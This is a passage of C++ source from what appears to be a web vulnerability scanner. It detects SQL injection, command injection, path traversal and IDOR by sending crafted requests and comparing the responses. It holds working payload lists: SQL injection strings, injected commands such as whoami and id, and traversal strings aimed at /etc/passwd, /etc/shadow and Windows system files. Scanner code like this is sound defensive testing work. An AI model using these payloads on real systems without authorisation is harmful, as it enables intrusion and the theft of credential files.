                            f.category = "idor";
                            
                            nlohmann::json evidence;
                            evidence["enumeration_type"] = "numeric_sequential";
                            evidence["original_id"] = resource_id.id_value;
                            evidence["tested_id"] = test_id_str;
                            evidence["user_b"] = user_b;
                            evidence["detection_method"] = "enumeration";
                            evidence["similarity_score"] = comparison.similarity_score;
                            
                            std::string enum_snippet = enum_resp.body.substr(0, 200);
                            if (enum_resp.body.length() > 200) enum_snippet += "...";
                            evidence["response_snippet"] = enum_snippet;
                            
                            f.evidence = evidence;
                            f.severity = "high";
                            f.confidence = 0.90;
                            f.remediation_id = "idor";
                            
                            findings.push_back(std::move(f));
                            break;  // Found one, that's enough
                        }
                    }
                }
            }
        } catch (...) {
            // ID parsing failed, skip enumeration
        }
    }
}

void VulnEngine::checkSQLInjection(const CrawlResult& result, std::vector<Finding>& findings) {
    // SQL injection payloads for different databases and detection methods
    struct SQLPayload {
        std::string payload;
        std::string db_type;  // "mysql", "postgresql", "sqlserver", "oracle", "generic"
        std::string detection_method;  // "error", "time", "boolean"
        double expected_delay_ms;  // For time-based payloads
    };
    
    // Error-based payloads
    std::vector<SQLPayload> error_payloads = {
        {"1'", "generic", "error", 0.0},
        {"1\"", "generic", "error", 0.0},
        {"1' OR '1'='1", "generic", "error", 0.0},
        {"1' UNION SELECT NULL--", "generic", "error", 0.0},
        {"1' AND 1=1--", "generic", "error", 0.0},
        {"1' AND 1=2--", "generic", "error", 0.0}
    };
    
    // Time-based blind payloads
    std::vector<SQLPayload> time_payloads = {
        {"1' AND SLEEP(5)--", "mysql", "time", 5000.0},
        {"1' AND SLEEP(5)#", "mysql", "time", 5000.0},
        {"1' AND pg_sleep(5)--", "postgresql", "time", 5000.0},
        {"1'; WAITFOR DELAY '00:00:05'--", "sqlserver", "time", 5000.0},
        {"1' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(32),5)--", "oracle", "time", 5000.0},
        {"1' OR SLEEP(5)--", "mysql", "time", 5000.0}
    };
    
    // Boolean-based blind payloads
    std::vector<SQLPayload> boolean_payloads = {
        {"1' AND '1'='1", "generic", "boolean", 0.0},
        {"1' AND '1'='2", "generic", "boolean", 0.0},
        {"1' OR '1'='1", "generic", "boolean", 0.0},
        {"1' OR '1'='2", "generic", "boolean", 0.0}
    };
    
    // Bypass technique payloads
    std::vector<SQLPayload> bypass_payloads = {
        {"1%27", "generic", "error", 0.0},  // URL encoded single quote
        {"1%2527", "generic", "error", 0.0},  // Double URL encoded
        {"1'/**/OR/**/1=1--", "generic", "error", 0.0},  // SQL comment bypass
        {"1'/*comment*/OR/*comment*/1=1--", "generic", "error", 0.0}  // Inline comment
    };
    
    // Skip if no parameters to test
    bool has_params = !result.params.empty();
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    
    if (!has_params && !is_post_put) {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Get baseline response for boolean-based detection
    HttpResponse baseline_resp;
    bool baseline_established = false;
    TimingBaseline timing_baseline;
    bool timing_baseline_established = false;
    
    if (baseline_comparator_ || timing_analyzer_) {
        HttpRequest baseline_req = base_req;
        if (client_.perform(baseline_req, baseline_resp)) {
            baseline_established = true;
        }
        
        if (timing_analyzer_) {
            timing_baseline = timing_analyzer_->establish_baseline(base_req);
            timing_baseline_established = (timing_baseline.sample_count >= 3);
        }
    }
    
    // Helper function to inject payload into request
    auto inject_payload = [&](const std::string& payload, const std::string& param_name = "") -> HttpRequest {
        HttpRequest req = base_req;
        
        if (has_params && !param_name.empty()) {
            // Inject into existing parameter
            req.url = build_url_with_param(result.url, result.params, param_name, payload);
        } else if (is_post_put) {
            // Inject into POST/PUT body
            if (has_params && !result.params.empty()) {
                // Use first parameter
                std::string first_param = result.params[0].first;
                std::ostringstream body;
                bool first = true;
                for (const auto& [key, value] : result.params) {
                    if (!first) body << "&";
                    if (key == first_param) {
                        body << url_encode(key) << "=" << url_encode(payload);
                    } else {
                        body << url_encode(key) << "=" << url_encode(value);
                    }
                    first = false;
                }
                req.body = body.str();
            } else {
                req.body = "id=" + payload;
            }
        } else {
            // Inject as new GET parameter
            size_t param_pos = req.url.find('?');
            if (param_pos != std::string::npos) {
                req.url += "&test=" + url_encode(payload);
            } else {
                req.url += "?test=" + url_encode(payload);
            }
        }
        
        return req;
    };
    
    // Test all parameters (GET params, POST body params, headers, cookies)
    std::vector<std::pair<std::string, std::string>> test_locations;
    
    // GET parameters
    for (const auto& [param, value] : result.params) {
        test_locations.push_back({"param", param});
    }
    
    // If no params but POST/PUT, test body
    if (is_post_put && result.params.empty()) {
        test_locations.push_back({"body", "id"});
    }
    
    // Test each location with payloads
    for (const auto& [location_type, location_name] : test_locations) {
        // 1. Error-based detection
        if (response_analyzer_) {
            for (const auto& sql_payload : error_payloads) {
                HttpRequest test_req = inject_payload(sql_payload.payload, location_name);
                HttpResponse test_resp;
                
                if (!client_.perform(test_req, test_resp)) {
                    continue;
                }
                
                // Convert headers to map
                std::map<std::string, std::string> headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    headers_map[key] = value;
                }
                
                // Analyze response for SQL errors
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                
                if (analysis.has_sql_error && analysis.detected_db_type != DatabaseType::UNKNOWN) {
                    // SQL injection detected via error-based method
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "sql_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    std::string db_name = "Unknown";
                    switch (analysis.detected_db_type) {
                        case DatabaseType::MYSQL: db_name = "MySQL"; break;
                        case DatabaseType::POSTGRESQL: db_name = "PostgreSQL"; break;
                        case DatabaseType::SQL_SERVER: db_name = "SQL Server"; break;
                        case DatabaseType::ORACLE: db_name = "Oracle"; break;
                        default: db_name = "Unknown"; break;
                    }
                    
                    nlohmann::json evidence;
                    evidence["description"] = "SQL injection detected via error-based method";
                    evidence["detection_method"] = "error-based";
                    evidence["database_type"] = db_name;
                    evidence["payload"] = sql_payload.payload;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["status"] = test_resp.status;
                    
                    // Add SQL error evidence
                    if (!analysis.matches.empty()) {
                        evidence["sql_error"] = analysis.matches[0].evidence;
                        evidence["sql_error_context"] = analysis.matches[0].context;
                    }
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = analysis.matches.empty() ? 0.85 : analysis.matches[0].confidence;
                    f.remediation_id = "sql_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location to avoid duplicates
                    break;
                }
            }
        }
        
        // 2. Time-based blind detection
        if (timing_analyzer_ && timing_baseline_established) {
            for (const auto& sql_payload : time_payloads) {
                HttpRequest test_req = inject_payload(sql_payload.payload, location_name);
                
                TimingResult timing_result = timing_analyzer_->test_payload_validated(
                    test_req, sql_payload.payload, timing_baseline, "sql");
                
                if (timing_result.is_anomaly && timing_result.confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "sql_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "SQL injection detected via time-based blind method";
                    evidence["detection_method"] = "time-based blind";
                    evidence["database_type"] = sql_payload.db_type;
                    evidence["payload"] = sql_payload.payload;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["baseline_time_ms"] = timing_baseline.average_time_ms;
                    evidence["measured_time_ms"] = timing_result.measured_time_ms;
                    evidence["deviation_ms"] = timing_result.deviation_ms;
                    evidence["deviation_percentage"] = timing_result.deviation_percentage;
                    evidence["expected_delay_ms"] = sql_payload.expected_delay_ms;
                    evidence["confidence"] = timing_result.confidence;
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = timing_result.confidence;
                    f.remediation_id = "sql_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
        
        // 3. Boolean-based blind detection
        if (baseline_comparator_ && baseline_established) {
            for (const auto& sql_payload : boolean_payloads) {
                HttpRequest test_req = inject_payload(sql_payload.payload, location_name);
                HttpResponse test_resp;
                
                auto start = std::chrono::high_resolution_clock::now();
                bool success = client_.perform(test_req, test_resp);
                auto end = std::chrono::high_resolution_clock::now();
                auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
                double test_timing_ms = static_cast<double>(duration.count());
                
                if (!success) {
                    continue;
                }
                
                // Compare with baseline
                ComparisonResult comparison = baseline_comparator_->compare(
                    baseline_resp, test_resp, timing_baseline, test_timing_ms, sql_payload.payload);
                
                // Check for significant differences that indicate boolean-based blind SQL injection
                bool indicates_sqli = false;
                double sqli_confidence = 0.0;
                
                if (comparison.length_changed && std::abs(comparison.length_change_percentage) > 20.0) {
                    // Significant length change
                    indicates_sqli = true;
                    sqli_confidence = 0.7;
                }
                
                if (comparison.similarity_score < 0.5) {
                    // Very different content
                    indicates_sqli = true;
                    sqli_confidence = std::max(sqli_confidence, 0.75);
                }
                
                if (comparison.has_new_errors && !comparison.new_errors.empty()) {
                    // New errors appeared
                    indicates_sqli = true;
                    sqli_confidence = std::max(sqli_confidence, 0.8);
                }
                
                // Test both true and false conditions
                if (sql_payload.payload.find("'1'='1") != std::string::npos) {
                    // This is a true condition - test false condition too
                    std::string false_payload = sql_payload.payload;
                    size_t pos = false_payload.find("'1'='1");
                    if (pos != std::string::npos) {
                        false_payload.replace(pos, 6, "'1'='2");
                        
                        HttpRequest false_req = inject_payload(false_payload, location_name);
                        HttpResponse false_resp;
                        client_.perform(false_req, false_resp);
                        
                        ComparisonResult false_comparison = baseline_comparator_->compare(
                            baseline_resp, false_resp, timing_baseline, 0.0, false_payload);
                        
                        // If true and false conditions produce different results, it's likely SQL injection
                        if (comparison.similarity_score != false_comparison.similarity_score ||
                            comparison.length_difference != false_comparison.length_difference) {
                            indicates_sqli = true;
                            sqli_confidence = std::max(sqli_confidence, 0.85);
                        }
                    }
                }
                
                if (indicates_sqli && sqli_confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "sql_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "SQL injection detected via boolean-based blind method";
                    evidence["detection_method"] = "boolean-based blind";
                    evidence["database_type"] = "Unknown";  // Can't determine from boolean-based
                    evidence["payload"] = sql_payload.payload;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["similarity_score"] = comparison.similarity_score;
                    evidence["length_change_percentage"] = comparison.length_change_percentage;
                    evidence["has_new_errors"] = comparison.has_new_errors;
                    evidence["confidence"] = sqli_confidence;
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = sqli_confidence;
                    f.remediation_id = "sql_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
    }
}

void VulnEngine::checkCommandInjection(const CrawlResult& result, std::vector<Finding>& findings) {
    // Command injection payloads for different OS types and detection methods
    struct CommandPayload {
        std::string payload;
        std::string os_type;  // "unix", "windows", "generic"
        std::string detection_method;  // "output", "time", "baseline"
        std::string separator;  // ";", "|", "&", "$(cmd)", "`cmd`", "\n"
        double expected_delay_ms;  // For time-based payloads
    };
    
    // Command output detection payloads (Unix)
    std::vector<CommandPayload> unix_output_payloads = {
        {"127.0.0.1; whoami", "unix", "output", ";", 0.0},
        {"127.0.0.1 | whoami", "unix", "output", "|", 0.0},
        {"127.0.0.1 & whoami", "unix", "output", "&", 0.0},
        {"127.0.0.1 `whoami`", "unix", "output", "`", 0.0},
        {"127.0.0.1 $(whoami)", "unix", "output", "$()", 0.0},
        {"127.0.0.1; id", "unix", "output", ";", 0.0},
        {"127.0.0.1; uname -a", "unix", "output", ";", 0.0},
        {"127.0.0.1; pwd", "unix", "output", ";", 0.0},
        {"127.0.0.1; ls -la", "unix", "output", ";", 0.0}
    };
    
    // Command output detection payloads (Windows)
    std::vector<CommandPayload> windows_output_payloads = {
        {"127.0.0.1 & whoami", "windows", "output", "&", 0.0},
        {"127.0.0.1 | whoami", "windows", "output", "|", 0.0},
        {"127.0.0.1 && whoami", "windows", "output", "&&", 0.0},
        {"127.0.0.1 & ver", "windows", "output", "&", 0.0},
        {"127.0.0.1 & hostname", "windows", "output", "&", 0.0},
        {"127.0.0.1 & dir", "windows", "output", "&", 0.0},
        {"127.0.0.1 | type C:\\Windows\\System32\\drivers\\etc\\hosts", "windows", "output", "|", 0.0}
    };
    
    // Time-based blind payloads (Unix)
    std::vector<CommandPayload> unix_time_payloads = {
        {"127.0.0.1; sleep 10", "unix", "time", ";", 10000.0},
        {"127.0.0.1 | sleep 5", "unix", "time", "|", 5000.0},
        {"127.0.0.1 & sleep 10", "unix", "time", "&", 10000.0},
        {"127.0.0.1 `sleep 10`", "unix", "time", "`", 10000.0},
        {"127.0.0.1 $(sleep 10)", "unix", "time", "$()", 10000.0}
    };
    
    // Time-based blind payloads (Windows)
    std::vector<CommandPayload> windows_time_payloads = {
        {"127.0.0.1 & timeout /t 10", "windows", "time", "&", 10000.0},
        {"127.0.0.1 | ping -n 10 127.0.0.1", "windows", "time", "|", 10000.0}
    };
    
    // Skip if no parameters to test
    bool has_params = !result.params.empty();
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    
    if (!has_params && !is_post_put) {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Get baseline response for baseline comparison
    HttpResponse baseline_resp;
    bool baseline_established = false;
    TimingBaseline timing_baseline;
    bool timing_baseline_established = false;
    
    if (baseline_comparator_ || timing_analyzer_) {
        HttpRequest baseline_req = base_req;
        if (client_.perform(baseline_req, baseline_resp)) {
            baseline_established = true;
        }
        
        if (timing_analyzer_) {
            timing_baseline = timing_analyzer_->establish_baseline(base_req);
            timing_baseline_established = (timing_baseline.sample_count >= 3);
        }
    }
    
    // Helper function to inject payload into request
    auto inject_payload = [&](const std::string& payload, const std::string& param_name = "") -> HttpRequest {
        HttpRequest req = base_req;
        
        if (has_params && !param_name.empty()) {
            // Inject into existing parameter
            req.url = build_url_with_param(result.url, result.params, param_name, payload);
        } else if (is_post_put) {
            // Inject into POST/PUT body
            if (has_params && !result.params.empty()) {
                // Use first parameter
                std::string first_param = result.params[0].first;
                std::ostringstream body;
                bool first = true;
                for (const auto& [key, value] : result.params) {
                    if (!first) body << "&";
                    if (key == first_param) {
                        body << url_encode(key) << "=" << url_encode(payload);
                    } else {
                        body << url_encode(key) << "=" << url_encode(value);
                    }
                    first = false;
                }
                req.body = body.str();
            } else {
                req.body = "host=" + payload;
            }
        } else {
            // Inject as new GET parameter
            size_t param_pos = req.url.find('?');
            if (param_pos != std::string::npos) {
                req.url += "&host=" + url_encode(payload);
            } else {
                req.url += "?host=" + url_encode(payload);
            }
        }
        
        return req;
    };
    
    // Test all parameters
    std::vector<std::pair<std::string, std::string>> test_locations;
    
    // GET parameters
    for (const auto& [param, value] : result.params) {
        test_locations.push_back({"param", param});
    }
    
    // If no params but POST/PUT, test body
    if (is_post_put && result.params.empty()) {
        test_locations.push_back({"body", "host"});
    }
    
    // Test each location with payloads
    for (const auto& [location_type, location_name] : test_locations) {
        // 1. Command output detection (Unix)
        if (response_analyzer_) {
            for (const auto& cmd_payload : unix_output_payloads) {
                HttpRequest test_req = inject_payload(cmd_payload.payload, location_name);
                HttpResponse test_resp;
                
                if (!client_.perform(test_req, test_resp)) {
                    continue;
                }
                
                // Convert headers to map
                std::map<std::string, std::string> headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    headers_map[key] = value;
                }
                
                // Analyze response for command output
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                
                if (analysis.has_command_output) {
                    // Command injection detected via output
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "command_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Command injection detected via command output";
                    evidence["detection_method"] = "output-based";
                    evidence["os_type"] = cmd_payload.os_type;
                    evidence["payload"] = cmd_payload.payload;
                    evidence["separator"] = cmd_payload.separator;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["status"] = test_resp.status;
                    
                    // Add command output evidence
                    if (!analysis.matches.empty()) {
                        for (const auto& match : analysis.matches) {
                            if (match.type == PatternType::COMMAND_OUTPUT) {
                                evidence["command_output"] = match.evidence;
                                evidence["command_output_context"] = match.context;
                                break;
                            }
                        }
                    }
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = analysis.matches.empty() ? 0.85 : analysis.matches[0].confidence;
                    f.remediation_id = "command_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
            
            // Command output detection (Windows)
            for (const auto& cmd_payload : windows_output_payloads) {
                HttpRequest test_req = inject_payload(cmd_payload.payload, location_name);
                HttpResponse test_resp;
                
                if (!client_.perform(test_req, test_resp)) {
                    continue;
                }
                
                // Convert headers to map
                std::map<std::string, std::string> headers_map;
                for (const auto& [key, value] : test_resp.headers) {
                    headers_map[key] = value;
                }
                
                // Analyze response for command output
                AnalysisResult analysis = response_analyzer_->analyze(test_resp.body, headers_map);
                
                if (analysis.has_command_output) {
                    // Command injection detected via output
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "command_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Command injection detected via command output";
                    evidence["detection_method"] = "output-based";
                    evidence["os_type"] = cmd_payload.os_type;
                    evidence["payload"] = cmd_payload.payload;
                    evidence["separator"] = cmd_payload.separator;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["status"] = test_resp.status;
                    
                    // Add command output evidence
                    if (!analysis.matches.empty()) {
                        for (const auto& match : analysis.matches) {
                            if (match.type == PatternType::COMMAND_OUTPUT) {
                                evidence["command_output"] = match.evidence;
                                evidence["command_output_context"] = match.context;
                                break;
                            }
                        }
                    }
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = analysis.matches.empty() ? 0.85 : analysis.matches[0].confidence;
                    f.remediation_id = "command_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
        
        // 2. Time-based blind detection (Unix)
        if (timing_analyzer_ && timing_baseline_established) {
            for (const auto& cmd_payload : unix_time_payloads) {
                HttpRequest test_req = inject_payload(cmd_payload.payload, location_name);
                
                TimingResult timing_result = timing_analyzer_->test_payload_validated(
                    test_req, cmd_payload.payload, timing_baseline, "command");
                
                if (timing_result.is_anomaly && timing_result.confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "command_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Command injection detected via time-based blind method";
                    evidence["detection_method"] = "time-based blind";
                    evidence["os_type"] = cmd_payload.os_type;
                    evidence["payload"] = cmd_payload.payload;
                    evidence["separator"] = cmd_payload.separator;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["baseline_time_ms"] = timing_baseline.average_time_ms;
                    evidence["measured_time_ms"] = timing_result.measured_time_ms;
                    evidence["deviation_ms"] = timing_result.deviation_ms;
                    evidence["deviation_percentage"] = timing_result.deviation_percentage;
                    evidence["expected_delay_ms"] = cmd_payload.expected_delay_ms;
                    evidence["confidence"] = timing_result.confidence;
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = timing_result.confidence;
                    f.remediation_id = "command_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
            
            // Time-based blind detection (Windows)
            for (const auto& cmd_payload : windows_time_payloads) {
                HttpRequest test_req = inject_payload(cmd_payload.payload, location_name);
                
                TimingResult timing_result = timing_analyzer_->test_payload_validated(
                    test_req, cmd_payload.payload, timing_baseline, "command");
                
                if (timing_result.is_anomaly && timing_result.confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "command_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Command injection detected via time-based blind method";
                    evidence["detection_method"] = "time-based blind";
                    evidence["os_type"] = cmd_payload.os_type;
                    evidence["payload"] = cmd_payload.payload;
                    evidence["separator"] = cmd_payload.separator;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["baseline_time_ms"] = timing_baseline.average_time_ms;
                    evidence["measured_time_ms"] = timing_result.measured_time_ms;
                    evidence["deviation_ms"] = timing_result.deviation_ms;
                    evidence["deviation_percentage"] = timing_result.deviation_percentage;
                    evidence["expected_delay_ms"] = cmd_payload.expected_delay_ms;
                    evidence["confidence"] = timing_result.confidence;
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = timing_result.confidence;
                    f.remediation_id = "command_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
        
        // 3. Baseline comparison detection
        if (baseline_comparator_ && baseline_established) {
            // Test with a simple command that should produce different output
            std::vector<CommandPayload> baseline_test_payloads = {
                {"127.0.0.1; echo TEST123", "unix", "baseline", ";", 0.0},
                {"127.0.0.1 | echo TEST123", "unix", "baseline", "|", 0.0},
                {"127.0.0.1 & echo TEST123", "unix", "baseline", "&", 0.0},
                {"127.0.0.1 & echo TEST123", "windows", "baseline", "&", 0.0}
            };
            
            for (const auto& cmd_payload : baseline_test_payloads) {
                HttpRequest test_req = inject_payload(cmd_payload.payload, location_name);
                HttpResponse test_resp;
                
                auto start = std::chrono::high_resolution_clock::now();
                bool success = client_.perform(test_req, test_resp);
                auto end = std::chrono::high_resolution_clock::now();
                auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
                double test_timing_ms = static_cast<double>(duration.count());
                
                if (!success) {
                    continue;
                }
                
                // Compare with baseline
                ComparisonResult comparison = baseline_comparator_->compare(
                    baseline_resp, test_resp, timing_baseline, test_timing_ms, cmd_payload.payload);
                
                // Check for significant differences that indicate command injection
                bool indicates_ci = false;
                double ci_confidence = 0.0;
                
                // Check if response contains the test marker
                if (test_resp.body.find("TEST123") != std::string::npos) {
                    indicates_ci = true;
                    ci_confidence = 0.9;
                }
                
                if (comparison.length_changed && std::abs(comparison.length_change_percentage) > 20.0) {
                    indicates_ci = true;
                    ci_confidence = std::max(ci_confidence, 0.7);
                }
                
                if (comparison.similarity_score < 0.5) {
                    indicates_ci = true;
                    ci_confidence = std::max(ci_confidence, 0.75);
                }
                
                if (indicates_ci && ci_confidence >= confidenceThreshold_) {
                    Finding f;
                    f.id = "finding_" + std::to_string(findings.size() + 1);
                    f.url = result.url;
                    f.method = result.method;
                    f.category = "command_injection";
                    f.headers = std::map<std::string, std::string>(
                        result.headers.begin(),
                        result.headers.end()
                    );
                    
                    nlohmann::json evidence;
                    evidence["description"] = "Command injection detected via baseline comparison";
                    evidence["detection_method"] = "baseline comparison";
                    evidence["os_type"] = cmd_payload.os_type;
                    evidence["payload"] = cmd_payload.payload;
                    evidence["separator"] = cmd_payload.separator;
                    evidence["parameter"] = location_name;
                    evidence["location"] = location_type;
                    evidence["similarity_score"] = comparison.similarity_score;
                    evidence["length_change_percentage"] = comparison.length_change_percentage;
                    evidence["contains_test_marker"] = (test_resp.body.find("TEST123") != std::string::npos);
                    evidence["confidence"] = ci_confidence;
                    
                    f.evidence = evidence;
                    f.severity = "critical";
                    f.confidence = ci_confidence;
                    f.remediation_id = "command_injection";
                    
                    findings.push_back(std::move(f));
                    
                    // Only report first successful detection per location
                    break;
                }
            }
        }
    }
}

void VulnEngine::checkPathTraversal(const CrawlResult& result, std::vector<Finding>& findings) {
    // Path traversal payloads for different OS types and encoding variants
    struct PathTraversalPayload {
        std::string payload;
        std::string os_type;  // "unix", "windows", "generic"
        std::string encoding_type;  // "basic", "url_encoded", "double_encoded", "null_byte", "unicode"
        std::string target_file;  // "passwd", "win.ini", "hosts", "generic"
        double confidence_boost;  // Additional confidence if file content detected
    };
    
    // Basic Unix path traversal payloads
    std::vector<PathTraversalPayload> unix_basic_payloads = {
        {"../../../etc/passwd", "unix", "basic", "passwd", 0.95},
        {"../../../../etc/passwd", "unix", "basic", "passwd", 0.95},
        {"../../../../../../etc/passwd", "unix", "basic", "passwd", 0.95},
        {"../../../etc/shadow", "unix", "basic", "shadow", 0.90},
        {"../../../etc/hosts", "unix", "basic", "hosts", 0.85}
    };
    
    // Basic Windows path traversal payloads
    std::vector<PathTraversalPayload> windows_basic_payloads = {
        {"..\\..\\..\\..\\windows\\win.ini", "windows", "basic", "win.ini", 0.95},
        {"..\\..\\..\\..\\windows\\system32\\config\\system", "windows", "basic", "system", 0.90},
        {"..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows", "basic", "hosts", 0.85}
    };
    
    // URL encoded traversal payloads
    std::vector<PathTraversalPayload> url_encoded_payloads = {
        {"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "unix", "url_encoded", "passwd", 0.95},
        {"..%2f..%2f..%2fetc%2fpasswd", "unix", "url_encoded", "passwd", 0.95},
        {"..%5c..%5c..%5cwindows%5cwin.ini", "windows", "url_encoded", "win.ini", 0.95}
    };
    
    // Double URL encoded traversal payloads
    std::vector<PathTraversalPayload> double_encoded_payloads = {
        {"..%252f..%252f..%252fetc%252fpasswd", "unix", "double_encoded", "passwd", 0.95},
        {"..%255c..%255c..%255cwindows%255cwin.ini", "windows", "double_encoded", "win.ini", 0.95}
    };
    
    // Null byte injection payloads
    std::vector<PathTraversalPayload> null_byte_payloads = {
        {"../../../etc/passwd%00.txt", "unix", "null_byte", "passwd", 0.90},
        {"..\\..\\..\\windows\\win.ini%00.txt", "windows", "null_byte", "win.ini", 0.90},
        {"../../../etc/passwd%2500.txt", "unix", "null_byte", "passwd", 0.90}
    };
    
    // Unicode encoded payloads
    std::vector<PathTraversalPayload> unicode_payloads = {
        {"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "unix", "unicode", "passwd", 0.85},
        {"..%e2%80%a5..%e2%80%a5etc%2fpasswd", "unix", "unicode", "passwd", 0.85}
    };
    
    // Alternative traversal sequences
    std::vector<PathTraversalPayload> alternative_payloads = {
        {"....//....//etc/passwd", "unix", "alternative", "passwd", 0.80},
        {"....\\\\....\\\\windows\\\\win.ini", "windows", "alternative", "win.ini", 0.80},
        {"..\\..//..\\etc/passwd", "unix", "alternative", "passwd", 0.80}
    };
    
    // Skip if no parameters to test
    bool has_params = !result.params.empty();
    bool is_post_put = (result.method == "POST" || result.method == "PUT");
    
    if (!has_params && !is_post_put) {
        return;
    }
    
    // Create base request
    HttpRequest base_req;
    base_req.method = result.method;
    base_req.url = result.url;
    base_req.headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
    
    // Add session cookies/headers if available
    enhance_request_with_session(base_req);
    
    // Get baseline response for baseline comparison
    HttpResponse baseline_resp;
    bool baseline_established = false;
    
    if (baseline_comparator_) {
        HttpRequest baseline_req = base_req;
        if (client_.perform(baseline_req, baseline_resp)) {
            baseline_established = true;
        }
    }
    
    // Helper function to inject payload into request
    auto inject_payload = [&](const std::string& payload, const std::string& param_name = "") -> HttpRequest {
        HttpRequest req = base_req;
        
        if (has_params && !param_name.empty()) {
            // Inject into existing parameter
            req.url = build_url_with_param(result.url, result.params, param_name, payload);
        } else if (is_post_put) {
            // Inject into POST/PUT body
            if (has_params && !result.params.empty()) {
                // Use first parameter
                std::string first_param = result.params[0].first;
                std::ostringstream body;
                bool first = true;
                for (const auto& [key, value] : result.params) {
                    if (!first) body << "&";
                    if (key == first_param) {
                        body << url_encode(key) << "=" << url_encode(payload);
                    } else {
                        body << url_encode(key) << "=" << url_encode(value);
                    }
                    first = false;
                }
                req.body = body.str();
            } else {
                req.body = "file=" + payload;
            }
        } else {
            // Inject as new GET parameter
            size_t param_pos = req.url.find('?');
            if (param_pos != std::string::npos) {
                req.url += "&file=" + url_encode(payload);
            } else {
                req.url += "?file=" + url_encode(payload);
            }
        }
        
        return req;
    };
    
    // Test all parameters
    std::vector<std::pair<std::string, std::string>> test_locations;
    
    // GET parameters
    for (const auto& [param, value] : result.params) {
        test_locations.push_back({"param", param});
    }
    
    // If no params but POST/PUT, test body
    if (is_post_put && result.params.empty()) {
        test_locations.push_back({"body", "file"});
    }
    
    // Combine all payloads
    std::vector<PathTraversalPayload> all_payloads;
